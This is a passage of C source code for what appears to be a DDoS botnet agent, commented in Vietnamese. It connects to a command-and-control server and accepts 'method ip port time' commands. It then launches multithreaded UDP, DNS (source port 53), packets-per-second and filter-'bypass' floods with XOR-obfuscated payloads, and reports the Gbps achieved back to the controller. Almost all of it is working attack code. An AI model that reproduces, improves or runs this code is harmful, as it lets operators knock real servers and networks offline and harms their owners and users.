        memcpy(buffer, bypass_patterns[pattern_idx].pattern, 
               bypass_patterns[pattern_idx].length);
        offset = bypass_patterns[pattern_idx].length;
    }
    
    // Tối ưu: Giảm random generation để tiết kiệm CPU
    for (int i = offset; i < PAYLOAD_SIZE; i++) {
        buffer[i] = rhexstring[i % 256][0];
        if (i % 128 == 0) {  // Giảm từ 64 xuống 128
            buffer[i] = rand() % 256;
        }
    }
}

// Hàm mới: Tạo hex payload tối ưu cho HEX method
void generate_optimized_hex_payload(unsigned char *buffer, int burst_count) {
    // Tạo hex pattern đơn giản và hiệu quả
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        // Sử dụng pattern hex đơn giản
        buffer[i] = (i + burst_count) % 256;
        
        // Thêm một số hex patterns đặc biệt
        if (i % 16 == 0) {
            buffer[i] = 0x41 + (burst_count % 26); // A-Z
        }
        if (i % 32 == 0) {
            buffer[i] = 0x30 + (burst_count % 10); // 0-9
        }
        if (i % 64 == 0) {
            buffer[i] = 0x00; // Null bytes
        }
    }
    
    // Thêm hex header
    buffer[0] = 0x48; // 'H'
    buffer[1] = 0x45; // 'E'
    buffer[2] = 0x58; // 'X'
    buffer[3] = 0x20; // Space
}

void generate_layer7_payload(unsigned char *buffer) {
    sprintf((char*)buffer, "GET /%d HTTP/1.1\r\nHost: %d.%d.%d.%d\r\n\r\n", 
            rand(), rand()%255, rand()%255, rand()%255, rand()%255);
}

void encrypt_payload(unsigned char *buffer, int len, uint8_t key) {
    for (int i = 0; i < len; i++) {
        buffer[i] ^= key;
        key = (key + 1) % 256;
    }
}

void obfuscate_payload(unsigned char *buffer, int len) {
    for (int i = 0; i < len; i++) {
        buffer[i] = (buffer[i] << 4) | (buffer[i] >> 4);
    }
}

void generate_bypass_payload(unsigned char *buffer, int pattern_idx) {
    int offset = 0;
    if (pattern_idx < sizeof(bypass_patterns) / sizeof(bypass_pattern_t)) {
        memcpy(buffer, bypass_patterns[pattern_idx].pattern, 
               bypass_patterns[pattern_idx].length);
        offset = bypass_patterns[pattern_idx].length;
    }
    
    for (int i = offset; i < PAYLOAD_SIZE; i++) {
        buffer[i] = rhexstring[i % 256][0];
        if (i % 64 == 0) buffer[i] = rand() % 256;
    }
    
    if (rand() % 2) generate_layer7_payload(buffer);
    
    encrypt_payload(buffer, PAYLOAD_SIZE, rand() % 256);
    obfuscate_payload(buffer, PAYLOAD_SIZE);
}

thread_data_t* init_thread_data_hex(config_t *cfg) {
    thread_data_t *data = aligned_alloc(64, sizeof(thread_data_t));
    if (!data) return NULL;
    
    memset(data, 0, sizeof(thread_data_t));
    
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        data->socks[i] = create_optimized_socket();
        if (data->socks[i] < 0) {
            for (int j = 0; j < i; j++) close(data->socks[j]);
            free(data);
            return NULL;
        }
    }
    
    data->addr.sin_family = AF_INET;
    data->addr.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_dest, &data->addr.sin_addr);
    
    for (int i = 0; i < BURST_SIZE; i++) {
        data->buffers[i] = aligned_alloc(64, PAYLOAD_SIZE);
        if (!data->buffers[i]) {
            for (int j = 0; j < i; j++) free(data->buffers[j]);
            for (int j = 0; j < SOCKETS_PER_THREAD; j++) close(data->socks[j]);
            free(data);
            return NULL;
        }
        
        // Sử dụng hàm hex tối ưu
        generate_optimized_hex_payload((unsigned char*)data->buffers[i], i);
        
        data->iovecs[i].iov_base = data->buffers[i];
        data->iovecs[i].iov_len = PAYLOAD_SIZE;
        
        data->msgs[i].msg_hdr.msg_name = &data->addr;
        data->msgs[i].msg_hdr.msg_namelen = sizeof(data->addr);
        data->msgs[i].msg_hdr.msg_iov = &data->iovecs[i];
        data->msgs[i].msg_hdr.msg_iovlen = 1;
        data->msgs[i].msg_hdr.msg_control = NULL;
        data->msgs[i].msg_hdr.msg_controllen = 0;
        data->msgs[i].msg_hdr.msg_flags = 0;
    }
    
    return data;
}

thread_data_t* init_thread_data_gudp(config_t *cfg) {
    thread_data_t *data = aligned_alloc(64, sizeof(thread_data_t));
    if (!data) return NULL;
    
    memset(data, 0, sizeof(thread_data_t));
    
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        data->socks[i] = create_optimized_socket();
        if (data->socks[i] < 0) {
            for (int j = 0; j < i; j++) close(data->socks[j]);
            free(data);
            return NULL;
        }
    }
    
    data->addr.sin_family = AF_INET;
    data->addr.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_dest, &data->addr.sin_addr);
    
    for (int i = 0; i < BURST_SIZE; i++) {
        data->buffers[i] = aligned_alloc(64, PAYLOAD_SIZE);
        if (!data->buffers[i]) {
            for (int j = 0; j < i; j++) free(data->buffers[j]);
            for (int j = 0; j < SOCKETS_PER_THREAD; j++) close(data->socks[j]);
            free(data);
            return NULL;
        }
        
        // Sử dụng hàm GUDP tối ưu
        generate_gudp_payload((unsigned char*)data->buffers[i], i);
        
        data->iovecs[i].iov_base = data->buffers[i];
        data->iovecs[i].iov_len = PAYLOAD_SIZE;
        
        data->msgs[i].msg_hdr.msg_name = &data->addr;
        data->msgs[i].msg_hdr.msg_namelen = sizeof(data->addr);
        data->msgs[i].msg_hdr.msg_iov = &data->iovecs[i];
        data->msgs[i].msg_hdr.msg_iovlen = 1;
        data->msgs[i].msg_hdr.msg_control = NULL;
        data->msgs[i].msg_hdr.msg_controllen = 0;
        data->msgs[i].msg_hdr.msg_flags = 0;
    }
    
    return data;
}

void* flood_worker_hex(void *arg) {
    thread_arg_t *targ = (thread_arg_t *)arg;
    config_t *cfg = targ->cfg;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(targ->cpu_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    thread_data_t *data = init_thread_data_hex(cfg);
    if (!data) {
        printf("[!] Thread %d: Failed to initialize\n", targ->thread_id);
        return NULL;
    }
    
    printf("[+] Thread %d started on CPU %d (HEX method)\n", targ->thread_id, targ->cpu_id);
    
    time_t end_time = time(NULL) + cfg->duration;
    int burst_count = 0;
    int consecutive_failures = 0;
    
    while (time(NULL) < end_time && running) {
        // Kiểm tra CPU load và tạm dừng nếu cần
        if (should_pause()) {
            usleep(SLEEP_INTERVAL);
            continue;
        }
        
        data->current_sock = (data->current_sock + 1) % SOCKETS_PER_THREAD;
        
        // Giảm burst size khi có lỗi liên tiếp
        int current_burst = BURST_SIZE;
        if (consecutive_failures > 3) {
            current_burst = BURST_SIZE / 2;
        }
        if (consecutive_failures > 6) {
            current_burst = BURST_SIZE / 4;
        }
        
        int sent = sendmmsg(data->socks[data->current_sock], 
                           data->msgs, current_burst, 0);
        
        if (sent > 0) {
            targ->packets_sent += sent;
            targ->bytes_sent += sent * PAYLOAD_SIZE;
            consecutive_failures = 0;  // Reset counter khi thành công
            
            // Thêm delay giữa các burst
            usleep(BURST_INTERVAL);
        } else {
            consecutive_failures++;
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(SLEEP_INTERVAL);
            } else {
                usleep(SLEEP_INTERVAL * 2);
            }
        }
        
        // Cập nhật hex pattern ít thường xuyên hơn để tiết kiệm CPU
        if (++burst_count % 1000 == 0) {
            for (int i = 0; i < BURST_SIZE; i += 64) {
                generate_optimized_hex_payload((unsigned char*)data->buffers[i], burst_count);
            }
        }
        
        // Cập nhật CPU load định kỳ
        if (burst_count % 200 == 0) {
            update_cpu_load();
        }
    }
    
    for (int i = 0; i < BURST_SIZE; i++) {
        free(data->buffers[i]);
    }
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        close(data->socks[i]);
    }
    free(data);
    
    printf("[+] Thread %d finished (HEX method)\n", targ->thread_id);
    return NULL;
}

void* flood_worker_gudp(void *arg) {
    thread_arg_t *targ = (thread_arg_t *)arg;
    config_t *cfg = targ->cfg;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(targ->cpu_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    thread_data_t *data = init_thread_data_gudp(cfg);
    if (!data) {
        printf("[!] Thread %d: Failed to initialize\n", targ->thread_id);
        return NULL;
    }
    
    printf("[+] Thread %d started on CPU %d (GUDP method)\n", targ->thread_id, targ->cpu_id);
    
    time_t end_time = time(NULL) + cfg->duration;
    int burst_count = 0;
    int consecutive_failures = 0;
    
    while (time(NULL) < end_time && running) {
        // Kiểm tra CPU load và tạm dừng nếu cần
        if (should_pause()) {
            usleep(SLEEP_INTERVAL);
            continue;
        }
        
        data->current_sock = (data->current_sock + 1) % SOCKETS_PER_THREAD;
        
        // Tăng burst size cho GUDP để tối đa hóa Gbps
        int current_burst = BURST_SIZE;
        if (consecutive_failures == 0) {
            current_burst = BURST_SIZE * 2; // Tăng gấp đôi khi không có lỗi
        } else if (consecutive_failures > 3) {
            current_burst = BURST_SIZE / 2;
        }
        
        int sent = sendmmsg(data->socks[data->current_sock], 
                           data->msgs, current_burst, 0);
        
        if (sent > 0) {
            targ->packets_sent += sent;
            targ->bytes_sent += sent * PAYLOAD_SIZE;
            consecutive_failures = 0;
            
            // Giảm delay cho GUDP để tăng throughput
            usleep(BURST_INTERVAL / 2);
        } else {
            consecutive_failures++;
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(SLEEP_INTERVAL);
            } else {
                usleep(SLEEP_INTERVAL * 2);
            }
        }
        
        // Cập nhật GUDP payload ít thường xuyên hơn
        if (++burst_count % 500 == 0) {
            for (int i = 0; i < BURST_SIZE; i += 32) {
                generate_gudp_payload((unsigned char*)data->buffers[i], burst_count);
            }
        }
        
        // Cập nhật CPU load định kỳ
        if (burst_count % 100 == 0) {
            update_cpu_load();
        }
    }
    
    for (int i = 0; i < BURST_SIZE; i++) {
        free(data->buffers[i]);
    }
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        close(data->socks[i]);
    }
    free(data);
    
    printf("[+] Thread %d finished (GUDP method)\n", targ->thread_id);
    return NULL;
}

void* flood_thread_dns(void *arg) {
    thread_arg_t *thread = (thread_arg_t *)arg;
    config_t *cfg = thread->cfg;

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread->cpu_id % get_cpu_cores(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    
    // Thêm timeout
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_dest, &target.sin_addr);

    char sendbuf[MAX_BURST][PAYLOAD_SIZE + sizeof(struct udphdr)];
    struct iovec iov[MAX_BURST];
    struct mmsghdr msgs[MAX_BURST];
    struct udphdr *udp_header;

    time_t end_time = time(NULL) + cfg->duration;
    int burst_count = 0;
    int consecutive_failures = 0;

    while (time(NULL) < end_time && running) {
        // Kiểm tra CPU load
        if (should_pause()) {
            usleep(SLEEP_INTERVAL);
            continue;
        }
        
        // Điều chỉnh burst size dựa trên lỗi
        int current_burst = cfg->burst_size;
        if (consecutive_failures > 3) {
            current_burst = cfg->burst_size / 2;
        }
        if (consecutive_failures > 6) {
            current_burst = cfg->burst_size / 4;
        }
        
        for (int i = 0; i < current_burst; i++) {
            int idx = rand() % total_payloads;
            int len = payload_lens[idx];
            if (len > cfg->packet_size) len = cfg->packet_size;

            memcpy(sendbuf[i], payloads[idx], len);
            udp_header = (struct udphdr *)sendbuf[i];
            udp_header->source = htons(53);
            udp_header->dest = htons(cfg->port);
            udp_header->len = htons(len);
            udp_header->check = checksum((unsigned short *)sendbuf[i], len);

            iov[i].iov_base = sendbuf[i];
            iov[i].iov_len = len;

            msgs[i].msg_hdr.msg_name = &target;
            msgs[i].msg_hdr.msg_namelen = sizeof(target);
            msgs[i].msg_hdr.msg_iov = &iov[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
            msgs[i].msg_hdr.msg_control = NULL;
            msgs[i].msg_hdr.msg_controllen = 0;
            msgs[i].msg_hdr.msg_flags = 0;
        }

        int sent = sendmmsg(sock, msgs, current_burst, 0);
        if (sent < 0) {
            consecutive_failures++;
            usleep(SLEEP_INTERVAL);
            continue;
        } else {
            consecutive_failures = 0;
        }
        
        // Thêm delay giữa các burst
        usleep(BURST_INTERVAL);
        burst_count++;
        
        // Cập nhật CPU load định kỳ
        if (burst_count % 50 == 0) {
            update_cpu_load();
        }
    }

    close(sock);
    return NULL;
}

void* flood_thread_gudp(void *arg) {
    thread_arg_t *thread = (thread_arg_t *)arg;
    config_t *cfg = thread->cfg;

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread->cpu_id % get_cpu_cores(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_dest, &target.sin_addr);

    char sendbuf[MAX_BURST][PAYLOAD_SIZE + sizeof(struct udphdr)];
    struct iovec iov[MAX_BURST];
    struct mmsghdr msgs[MAX_BURST];
    struct udphdr *udp_header;

    time_t start_time = time(NULL);
    time_t end_time = start_time + cfg->duration;
    int burst_count = 0;
    int consecutive_failures = 0;

    while (time(NULL) < end_time && running) {
        // Kiểm tra CPU load
        if (should_pause()) {
            usleep(SLEEP_INTERVAL);
            continue;
        }
        
        // Điều chỉnh burst size dựa trên thời gian và lỗi
        int current_burst = cfg->burst_size + ((time(NULL) - start_time) * cfg->burst_size / 20); 
        if (current_burst > MAX_BURST) current_burst = MAX_BURST;
        
        if (consecutive_failures > 3) {
            current_burst = current_burst / 2;
        }
        if (consecutive_failures > 6) {
            current_burst = current_burst / 4;
        }

        for (int i = 0; i < current_burst; i++) {
            int idx = rand() % total_payloads;
            int len = payload_lens[idx];
            if (len > cfg->packet_size) len = cfg->packet_size;

            memcpy(sendbuf[i], payloads[idx], len);

            udp_header = (struct udphdr *)sendbuf[i];
            udp_header->dest = htons(cfg->port);
            udp_header->len = htons(len);
            udp_header->check = checksum((unsigned short *)sendbuf[i], len);

            iov[i].iov_base = sendbuf[i];
            iov[i].iov_len = len;

            msgs[i].msg_hdr.msg_name = &target;
            msgs[i].msg_hdr.msg_namelen = sizeof(target);
            msgs[i].msg_hdr.msg_iov = &iov[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
            msgs[i].msg_hdr.msg_control = NULL;
            msgs[i].msg_hdr.msg_controllen = 0;
            msgs[i].msg_hdr.msg_flags = 0;
        }

        int sent = sendmmsg(sock, msgs, current_burst, 0);
        if (sent < 0) {
            consecutive_failures++;
            usleep(SLEEP_INTERVAL);
        } else {
            consecutive_failures = 0;
        }
        
        // Thêm delay giữa các burst
        usleep(BURST_INTERVAL);
        burst_count++;
        
        // Cập nhật CPU load định kỳ
        if (burst_count % 50 == 0) {
            update_cpu_load();
        }
    }

    close(sock);
    return NULL;
}



void trim(char *str) {
    if (str == NULL) return;
    char *start = str;
    while (*start && isspace((unsigned char)*start)) {
        start++;
    }
    char *end = str + strlen(str) - 1;
    while (end > start && isspace((unsigned char)*end)) {
        end--;
    }
    *(end + 1) = '\0';
    if (start != str) {
        memmove(str, start, strlen(start) + 1);
    }
}


void execute_attack(config_t *cfg, int sock) {
    printf("[*] Attacking %s:%d for %d seconds with method '%s'\n", 
           cfg->ip_dest, cfg->port, cfg->duration, cfg->method);

    // Tối ưu số lượng thread cho 3 cuộc tấn công đồng thời
    cfg->threads = get_cpu_cores() / 3;  // Giảm từ /2 xuống /3
    if (cfg->threads < 1) cfg->threads = 1;
    if (cfg->threads > 8) cfg->threads = 8;  // Giới hạn tối đa 8 threads
    
    cfg->burst_size = BURST_SIZE;
    cfg->packet_size = PAYLOAD_SIZE;

    printf("[*] Using %d threads for attack\n", cfg->threads);

    if (strcmp(cfg->method, "FJIUM-HEX") == 0) {
        pthread_t *threads = malloc(cfg->threads * sizeof(pthread_t));
        thread_arg_t *args = malloc(cfg->threads * sizeof(thread_arg_t));

        for (int i = 0; i < cfg->threads; i++) {
            args[i].cfg = cfg;
            args[i].thread_id = i;
            args[i].cpu_id = i % get_cpu_cores();
            args[i].packets_sent = 0;
            args[i].bytes_sent = 0;
            pthread_create(&threads[i], NULL, flood_worker_hex, &args[i]);
        }

        uint64_t total_packets = 0;
        uint64_t total_bytes = 0;

        for (int i = 0; i < cfg->threads; i++) {
            pthread_join(threads[i], NULL);
            total_packets += args[i].packets_sent;
            total_bytes += args[i].bytes_sent;
        }
        
        printf("[*] HEX Attack finished.\n");
        printf("[*] Total Packets Sent: %lu\n", total_packets);
        printf("[*] Total Bytes Sent: %lu\n", total_bytes);
        
        double gigabits = (double)(total_bytes * 8) / (1000 * 1000 * 1000);
        double pps = (double)total_packets / cfg->duration;

        printf("[*] Average Speed: %.2f Gbps\n", gigabits / cfg->duration);
        printf("[*] Average PPS: %.2f\n", pps);

        char response[BUF_SIZE];
        snprintf(response, sizeof(response), "HEX Attack completed: %lu packets, %.2f Gbps\n", total_packets, gigabits / cfg->duration);
        send(sock, response, strlen(response), MSG_NOSIGNAL);

        free(threads);
        free(args);

    } else if (strcmp(cfg->method, "FJIUM-GUDP") == 0) {
        pthread_t *threads = malloc(cfg->threads * sizeof(pthread_t));
        thread_arg_t *args = malloc(cfg->threads * sizeof(thread_arg_t));

        for (int i = 0; i < cfg->threads; i++) {
            args[i].cfg = cfg;
            args[i].thread_id = i;
            args[i].cpu_id = i % get_cpu_cores();
            args[i].packets_sent = 0;
            args[i].bytes_sent = 0;
            pthread_create(&threads[i], NULL, flood_worker_gudp, &args[i]);
        }

        uint64_t total_packets = 0;
        uint64_t total_bytes = 0;

        for (int i = 0; i < cfg->threads; i++) {
            pthread_join(threads[i], NULL);
            total_packets += args[i].packets_sent;
            total_bytes += args[i].bytes_sent;
        }
        
        printf("[*] GUDP Attack finished.\n");
        printf("[*] Total Packets Sent: %lu\n", total_packets);
        printf("[*] Total Bytes Sent: %lu\n", total_bytes);
        
        double gigabits = (double)(total_bytes * 8) / (1000 * 1000 * 1000);
        double pps = (double)total_packets / cfg->duration;

        printf("[*] Average Speed: %.2f Gbps\n", gigabits / cfg->duration);
        printf("[*] Average PPS: %.2f\n", pps);

        char response[BUF_SIZE];
        snprintf(response, sizeof(response), "GUDP Attack completed: %lu packets, %.2f Gbps\n", total_packets, gigabits / cfg->duration);
        send(sock, response, strlen(response), MSG_NOSIGNAL);

        free(threads);
        free(args);

    } else if (strcmp(cfg->method, "FJIUM-DNS") == 0) {
        cfg->burst_size = 64;  // Giảm từ 128 xuống 64
        cfg->packet_size = PAYLOAD_SIZE;
        printf("Preparing DNS payloads...\n");
        generate_dns_payloads();

        // Giảm số lượng process fork
        for (int i = 0; i < 1; i++) {  // Giảm từ 2 xuống 1
            pid_t pid = fork();
            if (pid == 0) {
                pthread_t tid[MAX_THREADS];
                thread_arg_t args[MAX_THREADS];
                for (int j = 0; j < cfg->threads; j++) {
                    args[j].cfg = cfg;
                    args[j].thread_id = j;
                    args[j].cpu_id = j % get_cpu_cores();
                    pthread_create(&tid[j], NULL, flood_thread_dns, &args[j]);
                }
                for (int j = 0; j < cfg->threads; j++) {
                    pthread_join(tid[j], NULL);
                }
                exit(0);
            } else if (pid < 0) {
                perror("fork failed");
                break;
            }
        }
        for (int i = 0; i < 1; i++) wait(NULL);  // Giảm từ 2 xuống 1
        printf("DNS flood complete.\n");

        char response[BUF_SIZE];
        snprintf(response, sizeof(response), "DNS flood completed\n");
        send(sock, response, strlen(response), MSG_NOSIGNAL);

    } else if (strcmp(cfg->method, "FJIUM-PPS") == 0) {
        // Không set nice(-20) để tránh ảnh hưởng đến hệ thống
        // nice(-10);  // Giảm priority thay vì tăng
        // mlockall(MCL_CURRENT | MCL_FUTURE);  // Bỏ comment này để tránh lock memory
        
        struct sockaddr_in target = {0};
        target.sin_family = AF_INET;
        target.sin_port = htons(cfg->port);
        inet_pton(AF_INET, cfg->ip_dest, &target.sin_addr);
        
        int cores = get_cpu_cores();
        int threads = cores / 3;  // Giảm từ cores / 2 xuống cores / 3
        if (threads < 1) threads = 1;
        if (threads > 4) threads = 4;  // Giới hạn tối đa 4 threads
        
        printf("[+] PPS ATTACK: %s:%d for %d s\n", cfg->ip_dest, cfg->port, cfg->duration);
        
        int *sockets = calloc(MAX_SOCKETS / 2, sizeof(int));  // Giảm từ MAX_SOCKETS / 4 xuống MAX_SOCKETS / 2
        int sock_count = 0;
        
        for (int i = 0; i < MAX_SOCKETS / 2; i++) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) break;
            
            int opt = 1;
            int buf = 16777216;  // Giảm từ 33554432 xuống 16777216 (16MB)
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
            setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
            setsockopt(sock, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
            setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, &opt, sizeof(opt));
            fcntl(sock, F_SETFL, O_NONBLOCK);
            
            sockets[sock_count++] = sock;
        }
        
        printf("[+] MEGA MODE: %d sockets | %d threads\n", sock_count, threads);
        
        pthread_t *tids = calloc(threads, sizeof(pthread_t));
        thread_data *tdata = calloc(threads, sizeof(thread_data));
        
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setstacksize(&attr, THREAD_STACK_SIZE);  // Sử dụng THREAD_STACK_SIZE
        
        int socks_per_thread = sock_count / threads;
        
        for (int i = 0; i < threads; i++) {
            tdata[i].sockets = &sockets[i * socks_per_thread];
            tdata[i].sock_count = (i == threads - 1) ? 
                sock_count - (i * socks_per_thread) : socks_per_thread;
            tdata[i].target = target;
            tdata[i].duration = cfg->duration;
            tdata[i].cpu_id = i;
            
            pthread_create(&tids[i], &attr, flood_thread_pps_enhanced, &tdata[i]);  // Sử dụng enhanced PPS
        }
        
        pthread_attr_destroy(&attr);
        
        for (int i = 0; i < threads; i++) {
            pthread_join(tids[i], NULL);
        }
        
        for (int i = 0; i < sock_count; i++) {
            close(sockets[i]);
        }
        
        printf("[+] PPS Attack completed\n");

        char response[BUF_SIZE];
        snprintf(response, sizeof(response), "PPS flood completed\n");
        send(sock, response, strlen(response), MSG_NOSIGNAL);
        
        free(sockets);
        free(tids);
        free(tdata);

    } else if (strcmp(cfg->method, "FJIUM-BYPASS") == 0) {
        pthread_t *threads = malloc(sizeof(pthread_t) * cfg->threads);
        thread_arg_t *args = malloc(sizeof(thread_arg_t) * cfg->threads);
        
        for (int i = 0; i < cfg->threads; i++) {
            args[i].cfg = cfg;
            args[i].thread_id = i;
            args[i].cpu_id = i % get_cpu_cores();
            args[i].packets_sent = 0;
            args[i].bytes_sent = 0;
            pthread_create(&threads[i], NULL, flood_worker_bypass, &args[i]);
        }
        
        uint64_t total_packets = 0, total_bytes = 0;
        for (int i = 0; i < cfg->threads; i++) {
            pthread_join(threads[i], NULL);
            total_packets += args[i].packets_sent;
            total_bytes += args[i].bytes_sent;
        }
        
        printf("[*] Bypass Attack finished: %lu packets sent, %lu bytes sent\n", total_packets, total_bytes);
        printf("[*] Average Speed: %.2f Gbps\n", (double)(total_bytes * 8) / (1000 * 1000 * 1000) / cfg->duration);
        printf("[*] Average PPS: %.2f\n", (double)total_packets / cfg->duration);
        
        char response[BUF_SIZE];
        snprintf(response, sizeof(response), "Bypass attack completed: %lu packets, %.2f Gbps\n", total_packets, (double)(total_bytes * 8) / (1000 * 1000 * 1000) / cfg->duration);
        send(sock, response, strlen(response), MSG_NOSIGNAL);
        
        free(threads);
        free(args);
    } else {
        printf("Unknown method: %s\n", cfg->method);
        char response[BUF_SIZE];
        snprintf(response, sizeof(response), "Unknown method: %s\n", cfg->method);
        send(sock, response, strlen(response), MSG_NOSIGNAL);
    }
}

// ================================================================= //
// =================== KHỐI MÃ ĐƯỢC THAY ĐỔI ======================= //
// ================================================================= //
void* client_thread(void *arg) {
    int sock = -1;
    struct sockaddr_in server_addr;

    while (running) {
        // Tạo socket mới cho mỗi lần kết nối lại
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            sleep(5); // Chờ trước khi thử lại
            continue;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        // Vòng lặp kết nối lại
        while (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection to server failed, retrying...");
            close(sock); // Đóng socket cũ
            sleep(5); // Chờ 5 giây trước khi thử lại
            sock = socket(AF_INET, SOCK_STREAM, 0); // Tạo socket mới
            if (sock < 0) {
                perror("Socket creation failed");
                sleep(5);
                continue;
            }
        }

        printf("[*] Connected to server %s:%d\n", SERVER_IP, SERVER_PORT);

        char buf[BUF_SIZE];
        char *parts[10];
        int part_count;

        while (running) {
            memset(buf, 0, sizeof(buf));
            ssize_t len = recv(sock, buf, sizeof(buf) - 1, 0);
            if (len <= 0) {
                printf("[!] Server disconnected. Reconnecting...\n");
                break; // Thoát vòng lặp nhận tin để kết nối lại
            }
            buf[len] = '\0';
            trim(buf);
            if (strlen(buf) == 0) continue;

            part_count = 0;
            char *token = strtok(buf, " ");
            while (token && part_count < 10) {
                parts[part_count++] = token;
                token = strtok(NULL, " ");
            }

            // Lệnh tấn công bây giờ có 4 phần: [method] [ip] [port] [time]
            if (part_count >= 4) {
                config_t cfg;
                memset(&cfg, 0, sizeof(cfg));
                
                // Định dạng lệnh mới: parts[0]=method, parts[1]=ip, parts[2]=port, parts[3]=time
                strncpy(cfg.method, parts[0], sizeof(cfg.method) - 1);
                strncpy(cfg.ip_dest, parts[1], sizeof(cfg.ip_dest) - 1);
                cfg.port = atoi(parts[2]);
                cfg.duration = atoi(parts[3]);

                printf("[*] Received attack command: %s %s %d %d\n", 
                       cfg.method, cfg.ip_dest, cfg.port, cfg.duration);

                // Kiểm tra attack queue trước khi thêm
                cleanup_finished_attacks(); // Dọn dẹp các attack đã hoàn thành
                
                if (add_attack_to_queue(&cfg)) {
                    char response[] = "Attack command received and queued.\n";
                    send(sock, response, strlen(response), MSG_NOSIGNAL);

                    pid_t pid = fork();
                    if (pid == 0) { // Tiến trình con
                        execute_attack(&cfg, sock);
                        exit(0);
                    } else if (pid > 0) { // Tiến trình cha
                        // Lưu PID vào queue để theo dõi
                        pthread_mutex_lock(&attack_queue_mutex);
                        for (int i = 0; i < MAX_CONCURRENT_ATTACKS; i++) {
                            if (attack_queue[i].active && 
                                strcmp(attack_queue[i].config.method, cfg.method) == 0 &&
                                strcmp(attack_queue[i].config.ip_dest, cfg.ip_dest) == 0 &&
                                attack_queue[i].config.port == cfg.port &&
                                attack_queue[i].config.duration == cfg.duration) {
                                attack_queue[i].pid = pid;
                                break;
                            }
                        }
                        pthread_mutex_unlock(&attack_queue_mutex);
                    } else {
                        perror("fork failed");
                        remove_attack_from_queue(-1); // Xóa attack khỏi queue nếu fork thất bại
                    }
                } else {
                    char response[BUF_SIZE];
                    snprintf(response, sizeof(response), "Attack queue is full. Please wait for current attacks to finish.\n");
                    send(sock, response, strlen(response), MSG_NOSIGNAL);
                }
            } else {
                char response[BUF_SIZE];
                snprintf(response, sizeof(response), "Unknown or incomplete command\n");
                send(sock, response, strlen(response), MSG_NOSIGNAL);
            }
        }
        close(sock); // Đóng socket khi mất kết nối
    }
    return NULL;
}
// ================================================================= //
// ==================== KẾT THÚC THAY ĐỔI ========================== //
// ================================================================= //


void signal_handler(int sig) {
    running = 0;
    printf("\n[!] Stopping...\n");
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    srand(time(NULL));

    get_system_memory();

    // Khởi động thread monitor CPU
    pthread_t cpu_monitor_tid;
    if (pthread_create(&cpu_monitor_tid, NULL, cpu_monitor_thread, NULL) != 0) {
        perror("Failed to start CPU monitor thread");
        return 1;
    }

    // Khởi động thread monitor attack queue
    pthread_t attack_queue_monitor_tid;
    if (pthread_create(&attack_queue_monitor_tid, NULL, attack_queue_monitor_thread, NULL) != 0) {
        perror("Failed to start attack queue monitor thread");
        return 1;
    }

    pthread_t client_tid;
    if (pthread_create(&client_tid, NULL, client_thread, NULL) != 0) {
        perror("Failed to start client thread");
        return 1;
    }

    pthread_join(client_tid, NULL);
    pthread_join(cpu_monitor_tid, NULL);
    pthread_join(attack_queue_monitor_tid, NULL);

    return 0;
}

// Hàm chọn pattern thông minh dựa trên effectiveness và category
int select_optimal_bypass_pattern(int burst_count, int consecutive_failures) {
    int num_patterns = sizeof(enhanced_bypass_patterns) / sizeof(enhanced_bypass_pattern_t);
    
    // Nếu có nhiều lỗi liên tiếp, ưu tiên patterns có effectiveness cao
    if (consecutive_failures > 5) {
        // Chỉ sử dụng patterns có effectiveness > 90
        int high_effect_patterns[50];
        int count = 0;
        
        for (int i = 0; i < num_patterns; i++) {
            if (enhanced_bypass_patterns[i].effectiveness > 90) {
